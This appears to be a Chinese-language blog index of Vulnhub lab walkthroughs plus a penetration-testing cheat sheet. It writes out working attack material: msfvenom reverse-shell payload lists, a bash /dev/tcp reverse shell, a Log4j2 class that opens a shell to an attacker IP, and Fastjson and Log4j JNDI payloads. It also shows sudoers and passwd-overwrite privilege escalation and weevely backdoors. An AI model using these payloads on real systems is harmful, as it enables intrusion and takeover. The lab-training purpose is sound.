\n\n\n生成后门文件hello.php，上传文件：直接使用weevely连接后门，连接成功：cat /etc/passwd查看用户列表：ls -a /var/www/html，查看服务器文件:发现hint.txt,cat查看，获得flag3和提示使用technawi登录：发现flag.txt,cat查看，发现没有权限：grep -r &lt;关键字&gt; &lt;目标查找路径&gt;,按提示查找“technawi”相关文件，找到疑似包含密码的文件：cat /etc/mysql/conf.d/credentials.txt查看目标文件，找到flag4和密码：当前用户没有权限直接su切换用户：用ssh试试，登陆成功，能够成功拿到/var/www/html/flag.txt中的flag5：  \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","weevely"]},{"title":"Vulnhub|SickOs1.1","url":"/4de57e3c.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。这个靶机安装时如果用的VMware，记得把.mf文件删掉！3.报“403”错误  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)、8080(http-proxy)和3128(squid-http)端口。8080是closed状态，先不管它。squid-http可以当作一个http代理服务  \n\n2.(80端口)web安全\nweb访问，查看源代码配置浏览器代理：成功访问，没有发现什么。web目录扫描dirb: dirb http://192.168.117.139 -p 192.168.117.139:3128nikto: nikto -h 192.168.117.139 -useproxy 192.168.117.139:3128访问/robots.txt访问/wolfcms浏览了一下系统，有一个下载文件，下载后打开查看，没有发现什么。继续扫一下目录dirb http://192.168.117.139/wolfcms -p 192.168.117.139:3128也没有发现什么，看网上的思路，直接访问/admin //这里不太明白访问的依据是什么访问/wolfcms/admin,自动跳转到后台登陆界面：尝试了一些常规办法，没有找到账户与密码的相关信息，后发现直接a使用弱口令dmin：admin登陆成功。登陆后类似一个博客管理系统。   \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n\nmsfvenom生成反弹shell代码+填入+metasploit监听\n该系统Pages/Edit Page意思能够直接修改php代码，验证一下：验证成功，使用msfvenom生成反弹shell代码：msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip地址&gt; lport=&lt;攻击机监听端口&gt; -o shell.php粘贴到编辑器并保存生效(注意要与原编辑器的内容组成一个完整的&lt;?php?&gt;结构)：metasploit开启监听：getshell成功，转成交互式shell：  \n\n4.提权\nls -a发现配置文件config.php,cat查看：找到数据库使用的是mysql，数据库名wolf，用户名root，密码john@123：直接用root：john@123这套账户密码su和ssh都登陆失败。cat /etc/passwd查看一些用户列表，发现用户sickos，用它尝试登陆一下：登陆成功，sudo -i切换为root，提权成功。  \n\n\nsudo -i：Linux终端命令下改变用户对命令使用权限的命令。获得的是root用户的环境。  \nsudo -s：执行环境变量中的 SHELL 所指定的 shell，或是 /etc/passwd 里所指定的 shell 。获得的是本身用户的环境。  \n\n\n进入/root，拿flag:  \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit","反弹shell","Msfvenom"]},{"title":"Vulnhub|Os-Hax","url":"/9c45f9e.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：1.靶机安装后无ip  \n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码dirb扫描web目录dirb http://192.168.xxx.xxx :访问http://192.168.117.135/html 没有什么有用信息:访问http://192.168.117.135/img 发现flaghost.png，打开发现没有明示什么有用的信息：下载下来，进一步查看是否进行了图片隐写strings &lt;文件名&gt;发现疑似密码的字符串：访问http://192.168.117.135/wordpress ：  \n\n页面的css样式没有加载出来，并且点击功能切换页面时，url会重定向到localhost：  \n解决办法：2.css加载异常&amp;url重定向   \n\n使用wpscan扫描:  \n\nwpscan是一款专门针对WordPress安全扫描器  \n\n\n\n\n功能\n命令\n\n\n\n\n扫描安装的插件\nwpscan –url http://192.168.xxx.xxx/wordpress –enumerate p\n\n\n扫描安装的插件的漏洞\nwpscan –url http://192.168.xxx.xxx/wordpress –enumerate vp\n\n\n枚举wordpress的用户\nwpscan –url http://192.168.xxx.xxx/wordpress –enumerate u\n\n\n\n发现一个用户web：结合上面发现的疑似密码字符串passw@45，尝试登陆，登陆失败：尝试取回口令，失败：查阅网上dalao的思路，发现这是一个目录……进入http://192.168.117.135/passw@45 发现flag2以及hostconfigure ：flag2内容是经过brainfuck加密的，解密得到账户密码：登陆后，发现该账户拥有超管权限：  \n\n3.getshell\n\n2021-12-03发布的提权相关文章getshell   \n\n3.1 msfvenom生成反弹shell代码msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip地址&gt; lport=&lt;攻击机监听端口&gt; -o shell.php3.2.1 该系统的/Appearance/theme editor下可直接修改php代码，故可在此填入：将msfvenom生成的反弹shell代码粘贴到某一个php编辑器中（要把首部的‘/*’去掉） ，上传：3.2.2 该系统的/Activity monitor存在Command Injection漏洞，可借此wget 反弹shell代码来反弹shell：  \n\n验证存在Command Injection漏洞：192.168.xxx.xxx|id  \n\n192.168.xxx.xxx|wget &lt;反弹shell所在路径/shell.php&gt;3.3 打开metasploit监听：\n\n注意：此处的lhost与lport必须是攻击机的ip与端口，即与3.1 msfvenom生成反弹shell代码配置的一样   \n\n3.4访问http://192.168.117.135/wordpress,getshell成功：获取交互式shell：python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;切换用户web登录，登陆成功：反思|前面获得一个账户密码的时候就应该尝试ssh，若能登录则无需反弹shell的内容由sh切换为bash：/bin/bash  \n\n/bin/sh与/bin/bash的区别  \n\nsh一般设成bash的软链(symlink)ls -l /bin/sh  \nlrwxrwxrwx 1 root root 4 Sep 14 04:45 /bin/sh -&gt; bash    \n在一般的Linux系统当中（例外如FreeBSD，OpenBSD等），使用sh调用执行脚本相当于打开了bash的POSIX标准模式。  \n也就是说 /bin/sh 相当于 /bin/bash –posix   \n\n\n查看系统用户 cat /etc/passwd:进入/home，有两个用户文件夹：进入/user-a，没有发现什么。进入/web，发现flag3：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权：利用awk：sudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;提权成功，进入/root寻找最后一个flag：\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit","反弹shell","Msfvenom"]},{"title":"Vulnhub|SickOs1.2","url":"/d4ec2f86.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：1.靶机安装后无ip  \n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码打开是一张图片blow.jpg。查看是否隐写，strings &lt;图片所在路径/文件名&gt; 没有发现什么。dirb扫描web目录dirb http://192.168.xxx.xxx //这里用nikto扫不到，不晓得为啥:访问http://192.168.xxx.xxx/test ,找到版本信息:上网搜版本漏洞，没有发现什么。查看/test目录支持的方法：nmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; 192.168.xxx.xxx  //还有很多其他方法具有潜在风险且可利用的method：验证可用PUT上传文件：  \n\n这里总是失败，报403，后发现是3.报“403”错误   \n\n1.BurpSuite：拦截请求，修改请求头与请求报文：2.nmap nmap 192.168.xxx.xxx -p 80 --script http-put --script-args http-put.url=&#39;/test/&lt;php文件名&gt;&#39;,http-put.file=&quot;&lt;php文件名&gt;&quot;&gt;3.curl curl -T &lt;php文件名&gt; http://192.168.xxx.xxx/test/ \n\ncurl上传出现417错误：需要在curl的参数中加上特定的HTTP Header Expect:，即将Header中Expect的值手动指定为空。  \n\n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\nA) 一句话木马+蚁剑+/usr/share/webshells/php/php-reverse-shell.phpPUT一句话木马：蚁剑连接成功：上传kali自带的反弹shell代码/usr/share/webshells/php/php-reverse-shell.php，方便后续操作：修改php-reverse-shell.php：通过蚁剑上传到/test目录下：攻击机开启端口监听nc -nvlp 443，在浏览器访问/test/php-reverse-shell.php。B) msfvenom生成反弹shell代码+PUT/上传+metasploit监听生成反弹shell：msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip&gt; lport=&lt;攻击机监听端口：443&gt; -o shell.phpcurl上传：curl -T &lt;反弹代码所在路径/shell.php&gt; -H &#39;Expect:&#39; &quot;http://192.168.xxx.xxx/test/&quot;metasploit监听443：getshell成功，转为交互式shell：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权：需要用户密码-失败。尝试suid提权：没有找到可行文件-失败。尝试在/etc/passwd添加用户：可写文件里没有/etc/passwd-失败。查看/etc/cron*下所含的所有文件ls la /etc/cron*:发现/etc/cron.daily文件下，root使用chkrootkit工具。  \n\nA)直接使用searchsploit chkrootkit查看说明文档 cat usr/share/exploitdb/linux/local/33899.txt按说明文档执行：利用chkrootkit，添加当前用户www-data到sudoers列表中：  \n\n/etc/sudoers 该文件允许特定用户像root用户一样使用各种各样的命令，而不需要root用户的密码。  \n\necho &#39;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#39; &gt; /tmp/updatesudo -i提权成功:  \n\nsudo -i：Linux终端命令下改变用户对命令使用权限的命令。获得的是root用户的环境。  \nsudo -s：执行环境变量中的 SHELL 所指定的 shell，或是 /etc/passwd 里所指定的 shell 。获得的是本身用户的环境。  \n\n   \n\n\nB)使用msf搜索exp：使用exp需要先获得一个session，重新用msf监听443，获取shell后，background返回上一层，成功获得一个session：使用chkrootkit的exp：提权成功，拿flag：  \n\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit","反弹shell","Msfvenom","http-methods"]},{"title":"getshell","url":"/75811fbe.html","content":"获取shell\n1.爆破\n优先使用条件：获得有限的账户池与密码池nmap -p 22 --script=ssh-brute --script-args userdb=&lt;账户池.txt&gt;,passdb=&lt;密码池.txt&gt; &lt;靶机ip&gt;使用实例：Vulnhub|Me and My Girlfriend\n\n2.利用exp\n优先使用条件：获得使用内容的版本信息（a）直接使用searchsploit  searchsploit &lt;内容信息&gt;（b）通过metasoploit  search &lt;内容信息&gt;使用实例：Vulnhub|SickOs1.2  \n\n3.反弹shell\n优先使用条件：3.1 有填入并生效php/jsp代码的交互msfvenom生成反弹shell代码+填入+metasploit监听使用实例：Vulnhub|Os-Hax  \n\nmsfvenom生成反弹shell代码 详见Tools-Msfvenom 反弹shell  \n\n3.2 能够PUT/上传代码（a）msfvenom生成反弹shell代码+PUT/上传+metasploit监听（b）一句话木马+蚁剑+kail自带反弹shell代码(/usr/share/webshells/~)使用实例：Vulnhub|SickOs1.2（c）weevely生成后门代码+PUT/上传+weevely连接后门生成后门 weevely generate &lt;password&gt; &lt;path&gt;连接后门 weevely &lt;URL&gt; &lt;password&gt; [cmd]使用实例：Vulnhub|JIS-CTF-VulnUpload-CTF01  \n3.3 有能够传入系统命令并执行的交互传入反弹shell的系统口令 ： bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;攻击机ip&gt;/&lt;攻击机监听端口&gt; 0&gt;&amp;1&#39;注意上述口令需要经过URL编码。使用实例：Vulnhub|DarkHole2  \n\n\n升级交互式shell\n\npython\n\n\nsudo  python -c 'import pty;pty.spawn(\"/bin/bash\")'  //python&lt;3\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n\n\n\n待续\n\n","categories":["渗透测试"],"tags":["getshell"]},{"title":"Vulnhub|Os-hackNos","url":"/a8b692c1.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：\n1.启动靶机时按shift，进入配置界面，修改配置信息：2.ip a查看网卡信息，可以看到靶机没有成功地被分配到ip，记住网卡名称ens33：3.vim /etc/network/interfaces看一下配置信息用的是哪一个网卡，把它们都改为ens33：/etc/init.d/networking restart重启网卡后，重新启动靶机。\n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码是一个apache2的默认页面，没有发现什么。dirb扫描web目录dirb http://192.168.xxx.xxx :访问http://192.168.117.134/drupal :该目录是一个内容管理系统。访问http://192.168.117.134/drupal/robots.txt :查看文件CHANGELOG.txt，获得版本信息：  \n\n3.getshell(msf)\n通过metasoploit搜索expsearch drupal：由于攻击目标不在根目录下，故需设置targeturi到对应目录/drupal：获取shell：将其转换成交互式的shell，先查看使用python版本：python&gt;3使用python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;：ls -a查看 /var/www/html 下的文件及文件夹：查看可疑文件alexander.txt：看上去经过base64加密，丢到网上解码器去解码：解码后的内容还是一段加密内容，查了一下发现像是经过brainfuck加密后的密文，继续解码：得到一个用户名和密码james:Hacker@4514，尝试直接su &lt;用户名&gt;切换登录：登陆失败，说明这套账户密码要么是闹你玩儿，要么是没有登陆权限。cat /etc/passwd 查看用户，发现是有james的，进入他的工作目录/home/james看一下，查看可疑文件user.txt:拿到第一个flag.txt    \n\n4. 提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权，因不知道当前用户的密码故不可行：尝试suid提权find / -perm -u=s -type f 2&gt;/dev/null:利用wget：用python3在靶机里搭建一个建议服务器python3 -m http.server 8888(我这里先切换到 /etc 是为了一会获取文件时候省得输入路径，就直接切换到文件所在路径下了)通过攻击机将靶机里的passwd文件通过wget下载出来(上一步如果没有切换到/etc去搭建服务器的话，就要输入完整的文件所在路径)wget http://192.168.117.134:8888/passwd在攻击机上创建一个本地加密用户：openssl passwd -l -salt cyytest 123456\n\n注意此处的用户名必需≥5，否则会失败气死  \n\n将刚创建的加密的本地用户添加到passwd中：&lt;用户名&gt;:&lt;加密后的内容&gt;0:0:0::/root:/bin/bash同样在攻击机上搭建一个服务器：在靶机上将攻击机上的passwd文件通过wget下载并覆盖原有的passwd:通过账户密码 cyytest:123456 登录，成功获取root权限：查看root.txt，拿到第二个flag:    \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit"]},{"title":"Tools","url":"/2b3bf173.html","content":"nmap\n常用-A依次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描。-p-全端口扫描。-p只扫描指定的端口。-h输出帮助信息。-Pn将所有主机都默认为在线，跳过主机发现。-iflist查看本地路由与接口。  \n目标说明-iL从已有ip列表文件中读取并扫描。-iR+随机选择目标进行扫描。--exclude+ip排除此ip。  \n主机发现-sL列出要扫描的ip。-sn不进行端口扫描。-Pn叫所有的主机都默认为在线，跳过主机发现。（全面、较慢）-PS/PA/PU/PY使用TCP、SYN/ACK、UDP或SCTP协议去发现端口。-PE/PP/PM使用ICMP响应（echo）、时间戳或子网掩码请求来发现探测。-PO使用IP协议的ping。-n不做DNS解析。-R总是做DNS反向解析。--dns-servers指定自定义的DNS服务器。--system-dns使用操作系统的DNS。--traceroute追踪每台主机的跳转路径。  \n扫描技术-sS/sT/sA/sW/sM使用SYN、TCP、全连接Connect()、ACK、Window、Maimon来进行扫描。-sUUDP扫描。-sN/sF/sX使用TCP Null(无flag)、FIN、Xmas（FIN+Push+Urgent）扫描。--scanflags +flags自定义TCP扫描的flags。-sI僵尸机扫描。-sY/sZ使用SCTP协议的INIT/COOKIE-ECHO扫描。-sO进行IP协议扫描。-b &lt;FTP relay host&gt;指定FTP中继主机进行FTP反弹扫描。--send-eth或--send-ip使用原始以太帧或IP数据包发送。  \n端口说明和扫描规则-p-全端口扫描。-p只扫描指定的端口。--exclude-ports不对此端口进行扫描。-F快速模式，扫描比默认端口数量更少的端口。-r有序地扫描端口而不是随机地扫描。--top-ports &lt;number&gt;扫描排名指定的数字前几位的最常用的端口。--port-ratio &lt;ratio&gt;扫描比输入的比例更常用的端口。  \n服务、版本探测-sV探测开启的端口来获取服务、版本信息。-V输出版本号。--version-intensity &lt;level&gt;设置探测服务、版本信息的强度。--version-light强度为2的探测强度。--version-all强度为9的探测强度。--version-trace将扫描的具体过程显示出来。  \n脚本扫描-sC等同于--script=default。--script=&lt;Lua scripts&gt;指定使用Lua脚本进行扫描。--script-args=&lt;n1=v1,[n2=v2,...]&gt;指定脚本的参数。--script-args-file=filename指定提供脚本参数的文件。--script-trace显示全部发送和收到的数据。--script-updatedb更新脚本的数据库。--script-help=&lt;Lua script&gt;显示脚本的相关信息。  \n防火墙、IDS绕过和欺骗--proxies &lt;url1,[url2],...&gt;指定代理服务器进行扫描。--privileged假设用户有全部权限。--unprivileged假设用户缺少原始套接字权限。-f;--mtu &lt;val&gt;设置MTU最大传输单元。-D &lt;诱饵ip1,诱饵ip2,...&gt;&lt;目标ip&gt;或-D &lt;RND:number&gt;&lt;目标ip&gt;指定多个诱饵IP或者使用RND随机生成number个诱饵IP，对目标主机进行IP欺骗。-S &lt;ip&gt;伪造源地址。-e &lt;iface&gt;使用指定的接口。-g或--source-port &lt;portnum&gt;使用指定的源端口。--data &lt;hex string&gt;在发送包的数据字段中追加自定义的十六进制字符串。--data-string &lt;string&gt;在发送报的数据字段中追加自定义的ASCII字符串。--data-length &lt;num&gt;在发送报的数据字段中追加随机的数据。--ip-options &lt;options&gt;使用指定的IP选项发送包。ttl &lt;val&gt;设置TTL值。--spoof-mac &lt;mac address/prefix/vendor name&gt;伪造源MAC地址。--badsum发送伪造TCP/UDP/SCTP校验和Checksum的数据包。  \n\nSQLMAP\n爆数据库名sqlmap -r E:\\Brup_cap\\1.txt --dbs --batchsqlmap -u &lt;url&gt; --cookie=&quot;PHPSESSID=dwqedewfqfrfq;security=low&quot; --dbs //cookie为注入点  \n爆表名sqlmap -r 1.txt -D &lt;database_name&gt; --tables --batch  \n爆字段名sqlmap -r 1.txt -D &lt;database_name&gt; -T &lt;table_name&gt; --columns --batch  \n字段内容sqlmap -r 1.txt -D &lt;database_name&gt; -T &lt;table_name&gt; -C &lt;column1,column2…&gt; --dump --batch  \n试探WAFsqlmap -u &lt;url&gt; --identify-waf --batch  \ntamper脚本sqlmap -u &lt;url&gt; --tamper &lt;模块名&gt;脚本位置：~/sqlmap/tamper  \n\nMsfvenom 反弹shell\nPayLoads ListBinaries Payloads\n#[Linux]  \nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f elf -o shell.elf   \n#[Windows]  \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f exe -o shell.exe  \n#[Mac]  \nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f macho -o shell.macho  \n\nWeb Payloads\n#[PHP->.php]  \nmsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -o shell.php  \n#[JAVA->.jar]  \nmsfvenom -p java/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f jar -o shell.jar  \n#[ASP->.asp]  \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f asp -o shell.asp  \n#[JSP->.jsp]  \nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -o shell.jsp  \n#[JSP->.war]  \nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f war -o shell.war  \n\nScripting Payloads\n#[Python]  \nmsfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw -o shell.py  \n#[Bash]  \nmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw -o shell.sh  \n#[Perl]  \nmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw -o shell.pl  \n\nShellCode Payloads\n#[Linux Based Shellcode]  \nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language>  \n#[Windows Based Shellcode]  \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language>  \n#[Mac Based Shellcode]  \nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language>  \n\n监听-getshell\nmsfconsole  \nuse exploit/multi/handler  \nset payload &lt;payload>  \nset lhost &lt;Your IP Address>  \nset lport &lt;Your Port to Connect On>  \nrun  \n这里的触发条件要是实际情况而定，有的是直接访问对应页面，有的是直接在前端对上传文件进行操作而触发。  \n\n\n蚁剑\n数据管理-右键-添加数据  \n\n[URL]要填到.php目录。\n[连接密码]为[“”]内部的参数。  \n\n\nweevely\n生成后门weevely generate &lt;password&gt; &lt;file&gt;  \n连接后门weevely &lt;url&gt; &lt;password&gt; [cmd]  \n[cmd]\n\n\n模块名\n注释\n模块名\n注释\n\n\n\n\n:shell_su\n通过更变使用者来执行shell命令，可以获得root权限来执行命令\n:bruteforce_sql\n可用来猜解数据库密码\n\n\n:shell_sh\n执行 shell 命令\n:file_find\n查找具有给定名称和属性的文件\n\n\n:shell_php\n执行 PHP 命令\n:file_download\n从远程文件系统下载文件\n\n\n:system_extensions\n收集PHP和webserver扩展列表\n:file_check\n获取文件的属性和权限\n\n\n:system_info\n收集系统信息\n:file_touch\n更改文件时间戳\n\n\n:system_procs\n列出正在运行的进程\n:file_cd\n更改当前工作目录\n\n\n:audit_disablefunctionbypass\n使用mod_cgi和.htaccess绕过系统禁用函数的限制\n:file_grep\n打印与多个文件中的模式匹配的行\n\n\n:audit_etcpasswd\n查看/etc/passwd文件\n:file_gzip\n压缩或解压gzip文件\n\n\n:audit_suidsgid\n查找带有SUID或SGID标志的文件\n:file_tar\n压缩或解压tar文件\n\n\n:audit_phpconf\n查看php配置信息\n:file_enum\n检查路径列表的存在和权限\n\n\n:audit_filesystem\n审核文件系统的弱权限(找777权限)\n:file_cp\n复制单个文件\n\n\n:backdoor_reversetcp\n执行反向TCP shell.需要nc -lvp 监听\n:file_mount\n使用HTTPfs挂载远程文件系统\n\n\n:backdoor_tcp\n在TCP端口上生成shell\n:file_clearlog\n从文件中删除字符串\n\n\n:net_scan\nTCP端口扫描\n:file_zip\n压缩或解压zip文件\n\n\n:net_mail\n发送邮件\n:file_upload\n文件上载到远程文件系统\n\n\n:net_ifconfig\n获取网络接口地址\n:file_upload2web\n自动将文件上传到Web文件夹并获取相应的URL\n\n\n:net_curl\n执行类似curl的HTTP请求\n:file_edit\n在本地编辑器上编辑远程文件\n\n\n:net_proxy\n运行本地代理以通过目标转移HTTP/HTTPS浏览\n:file_read\n从远程文件系统中读取远程文件\n\n\n:net_phpproxy\n在目标上安装PHP代理\n:file_webdownload\n指定URL下载文件\n\n\n:file_ls\n列出目录内容\n:file_rm\n删除远程文件\n\n\n:sql_dump\nMulti dbms mysqldump replacement\n:sql_console\n执行SQL查询或运行sql控制台\n\n\n\n\nmarshalsec（java反序列化工具）Fastjson反序列化代码\n// javac TouchFile.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class TouchFile &#123;\n   static &#123;\n       try &#123;\n           Runtime rt = Runtime.getRuntime();\n           String[] commands = &#123;\"touch\", \"/tmp/success\"&#125;;\n           Process pc = rt.exec(commands);\n           pc.waitFor();\n       &#125; catch (Exception e) &#123;\n           // do nothing\n       &#125;\n   &#125;\n&#125;\n通过 javac TouchFile.java 将 .java代码 编译成 .class类，并在类所在文件夹搭建http服务 python3 -m http.server &lt;http端口&gt; 或 python -m SimpleHTTPServer &lt;http端口&gt; 。  \n\n开启RMI服务\n在marshalsec目录，执行命令，开启RMI服务，映射&lt;http端口&gt;为&lt;rmi服务监听端口&gt;，并制定加载远程类 &lt;类名&gt;.classjava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://&lt;攻击机ip>:&lt;http端口>/#&lt;类名>\" &lt;rmi服务监听端口>  \n\nPOST json对象\n构建Payload，将自定义json对象POST至目标服务器// Fastjson &lt;= 1.2.24  \n&#123;\n   \"b\":&#123;\n       \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n       \"dataSourceName\":\"rmi://&lt;攻击机ip>:&lt;rmi服务监听端口>/&lt;类名>\",\n       \"autoCommit\":true\n   &#125;\n&#125;\n// Fastjson &lt;= 1.2.47\n&#123;\n   \"a\":&#123;\n       \"@type\":\"java.lang.Class\",\n       \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n   &#125;,\n   \"b\":&#123;\n       \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n       \"dataSourceName\":\"rmi://&lt;攻击机ip>:&lt;rmi服务监听端口>/&lt;类名>\",\n       \"autoCommit\":true\n   &#125;\n&#125;\n\nLog4j2反序列化代码\n//javac Log4j2.java\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.lang.Runtime;\nimport java.lang.Process;\npublic class Log4j2&#123;\n   public Log4j2() throws Exception &#123;\n       //创建一个进程的实例\n       Process p = Runtime.getRuntime().exec(new String[]&#123;\"/bin/bash\",\"-c\",\"bash -i >&amp; /dev/tcp/&lt;攻击机ip>/&lt;类端口> 0>&amp;1\"&#125;);\n       InputStream is = p.getInputStream();//输入流\n       BufferedReader reader = new BufferedReader(new InputStreamReader(is));//输入流缓冲区\n       String line;\n       while((line = reader.readLine()) != null) &#123;//循环读取缓冲区中的数据\n           System.out.println(line);//输出获取 的数据\n       &#125;\n       p.waitFor();//waitFor：返回该Process对象代表的进程的出口值，值0表示正常退出，非0非正常。\n       is.close(); \n       reader.close();\n       p.destroy();//destroy：杀掉该Process对象代表的进程。\n   &#125;\n   public static void main(String[] args) throws Exception &#123;\n   &#125;\n&#125;\n\n开启LDAP服务\n在marshalsec目录，执行命令，开启LDAP服务，映射&lt;http端口&gt;为&lt;ldap监听端口&gt;，并制定加载远程类 &lt;类名&gt;.classjava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://&lt;攻击机ip>:&lt;http端口>/#&lt;类名>\" &lt;ldap监听端口>  \n\nPOST json对象\n构建Payload，将自定义json对象POST至目标服务器u=$&#123;jndi:ldap://&lt;攻击机ip>:&lt;ldap监听端口>/&lt;类名>&#125;\n\n注意\n\nPOST请求中需要规定 Content-Type: application/json  \n区分类端口 和 服务端口。类端口：监听拿shell，服务端口：构造payload。\n\n\n扫目录\ngobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.228.131/ -x php,html,txt  \ndirb http://192.168.228.131  \nnikto -h 192.168.228.131  \n","categories":["渗透测试"],"tags":["Tools"]},{"title":"Vulnhub|Me and My Girlfriend","url":"/6ceb590b.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内：\n\n1.信息收集\n主机扫描root@kali:~# nmap 192.168.xxx.0/24开放了ssh(22)和http(80)。\n\n2.(80端口)web安全\n2.1 web访问，查看页面源代码提示利用x-forward-for，在浏览器借助工具在请求头中加入 X-Forward-For:127.0.0.1 ,访问成功：注册一个账号用户登录：使用注册的账户登录：2.2 水平越权点击profile，请求中带有参数user_id：通过编辑user_id，能够获得其他用户的信息,存在水平越权：  \n\n此处可以通过样式编辑器编辑元素类型为text，即可将密码明文显示：  \n\n通过上述操作，可以收集到每个用户对应的账号与密码：\n\n\n\nusername\npassword\n\n\n\n\neweuhtandingan\nskuyatuh\n\n\naingmaung\nqwerty!!!\n\n\nsundatea\nindONEsia\n\n\nsedihaingmah\ncedihhihihi\n\n\nalice\n4lic3\n\n\n\n\n3.(22端口)SSH\n虽然通过2.2收集到的账户与密码，但不知道具有ssh登陆权限的账户密码是哪一个。将账户密码分别存储为uname.txt和passwd.txt：getshell (SSH爆破)root@kali:~# nmap -p 22 --script=ssh-brute --script-args userdb=uname.txt,passdb=passwd.txt 192.168.xxx.xxx获得可用账户密码：alice/4lic3 ：  \n\n使用Xshell远程登陆(ssh登陆的方式很多，直接用 ssh alice@&lt;靶机ip&gt; 也行)  \n\n“我是谁？我在哪？我有啥？”\n\n\n\n口令\n解释\n\n\n\n\nwhoami\n显示当前用户\n\n\npwd\n显示工作路径\n\n\nls -a\n当前目录下所有文件夹及文件\n\n\n\n显示可疑目录.my_secret 进入后 ls -a，查看flag1.txt，文件包含flag，及提示需要获得root权限才能得到另一个flag：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权sudo提权 (这里尝试sudo提权时发现具有提权条件，故暂不尝试其他提权方式)查询具有sudo权限命令：sudo -l\n尝试使用sudo-php提权(命令的含义我也不太懂，把它当作一种固定的语句吧):  CMD=\"/bin/sh\"  \nsudo php -r \"system('$CMD');\"\n使用 whoami 提权成功：进入 /root 目录，查看文件，找到flag2.txt：  \n\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","水平越权","SSH爆破"]},{"title":"提权","url":"/e2181504.html","content":"提权途径\n1. sudo\n能够以root权限执行的命令  \n\nsudo -l //查询当前用户具有sudo权限命令\n\n\n2. 